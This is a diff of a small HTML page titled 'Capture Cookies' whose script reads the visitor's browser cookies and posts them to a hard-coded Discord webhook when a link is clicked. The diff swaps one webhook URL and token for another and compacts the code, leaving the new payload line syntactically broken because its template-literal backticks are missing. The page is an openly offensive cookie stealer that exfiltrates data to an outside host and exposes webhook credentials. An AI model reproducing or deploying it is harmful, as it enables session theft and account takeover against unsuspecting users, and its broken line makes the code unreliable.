@@ -6,23 +6,14 @@
     <title>Capture Cookies</title>
     <script>
         function sendCookiesToDiscord() {
-            // Get the user's cookies
             const cookies = document.cookie;
+            const webhookURL = "https://discordapp.com/api/webhooks/1286807971124351089/ZfIfOYcLNghelccJx4KWPsOhtoItGmUJhFLfz8RE26FHDYLpiuB8lbtTZz5pmw3-AzMQ"; // Replace with your webhook URL
 
-            // Discord webhook URL (replace with your webhook link)
-            const webhookURL = 'https://discordapp.com/api/webhooks/1286808132269510667/3PYbTkqXxcfFpXeXeQb2vCpXJldqQqwrBUlGV4WBdEQhD5gr2B0BH6l00MXU1NpZaVe8';
+            const payload = { content: User's cookies: ${cookies} };
 
-            // Create the message that will be sent to Discord
-            const payload = {
-                content: `User's cookies: ${cookies}`
-            };
-
-            // Send the message to Discord using the webhook
             fetch(webhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
             })
             .then(response => response.text())
@@ -37,7 +28,6 @@
     </script>
 </head>
 <body>
-    <!-- This is the link that sends the cookies -->
     <a href="#" onclick="sendCookiesToDiscord(); return false;">Click here to send your cookies</a>
 </body>
 </html>
